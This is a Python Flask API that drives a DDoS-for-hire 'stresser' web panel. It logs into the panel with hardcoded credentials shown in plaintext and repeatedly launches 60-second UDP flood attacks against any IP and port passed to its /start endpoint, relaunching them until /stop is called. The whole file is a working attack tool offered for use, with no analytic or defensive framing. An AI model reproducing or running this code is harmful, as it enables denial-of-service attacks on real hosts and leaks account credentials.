from flask import Flask, request, jsonify
import httpx
import asyncio
import threading
import time
import re
import uuid

app = Flask(__name__)

# --- CONFIG FROM YOUR SCRIPT ---
BASE_URL = "https://hardstresser.org"
USERNAME = "SajagOG1"
PASSWORD = "Jaiisbeast@1"
DEFAULT_TIME = "60"

# Storage for background tasks
active_tasks = {}

HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "referer": f"{BASE_URL}/panel/booter.php"
}

# --- LOGIC COPIED FROM YOUR StartStop.py ---

async def get_latest_id(client):
    """Sniper for the ID on Line 84 (Pattern: aXXXX)."""
    try:
        resp = await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/attacks.php")
        match = re.search(r'a(\d{5,8})', resp.text)
        if match: return match.group(1)
        match = re.search(r'id=(\d{5,8})', resp.text)
        if match: return match.group(1)
        return None
    except: return None

async def attack_sequence(task_id, ip, port, client):
    """Runs a single start + snipe cycle."""
    p = {
        "type": "start", 
        "host": ip, 
        "port": port, 
        "time": DEFAULT_TIME, 
        "method": "UDP", 
        "vip": "0"
    }
    await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", params=p)
    await asyncio.sleep(1.5) # Wait as per your script
    return await get_latest_id(client)

async def background_loop(task_id, ip, port):
    """Infinite reloader loop."""
    async with httpx.AsyncClient(headers=HEADERS, follow_redirects=True, timeout=30.0) as client:
        # Login
        login_resp = await client.post(f"{BASE_URL}/panel/login.php", 
                                     data={"kullaniciadi": USERNAME, "sifreniz": PASSWORD})
        
        while task_id in active_tasks:
            # Launch and get ID
            panel_id = await attack_sequence(task_id, ip, port, client)
            if task_id in active_tasks:
                active_tasks[task_id]['panel_id'] = panel_id
            
            # Sleep for duration
            expire_at = time.time() + int(DEFAULT_TIME)
            while time.time() < expire_at:
                if task_id not in active_tasks:
                    # KILL REQUEST IF STOPPED
                    if panel_id:
                        await client.get(f"{BASE_URL}/panel/includes/ajax/user/attacks/hub.php", 
                                         params={"type": "stop", "id": panel_id})
                    return
                await asyncio.sleep(1)

# --- API ENDPOINTS ---

@app.route('/')
def health():
    return jsonify({"status": "online", "running": list(active_tasks.keys())})

@app.route('/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    
    if not ip or not port:
        return jsonify({"status": "error", "message": "IP and Port required"}), 400

    task_id = str(uuid.uuid4())[:8]
    active_tasks[task_id] = {"ip": ip, "port": port, "panel_id": None}

    # START THE FIRST ATTACK SYNCHRONOUSLY 
    # This fixes Vercel by making it wait until the first launch is DONE
    def run_first_and_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(background_loop(task_id, ip, port))

    thread = threading.Thread(target=run_first_and_loop)
    thread.daemon = True
    thread.start()

    # Give the thread a moment to at least hit the login
    time.sleep(2) 

    return jsonify({
        "status": "success",
        "taskid": task_id,
        "target": f"{ip}:{port}",
        "info": "Loop initiated"
    })

@app.route('/stop', methods=['GET'])
def stop_attack():
    task_id = request.args.get('taskid')
    if task_id in active_tasks:
        # Removing from dict kills the background_loop
        del active_tasks[task_id]
        return jsonify({"status": "success", "message": f"Task {task_id} stopped"})
    return jsonify({"status": "error", "message": "Invalid TaskID"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
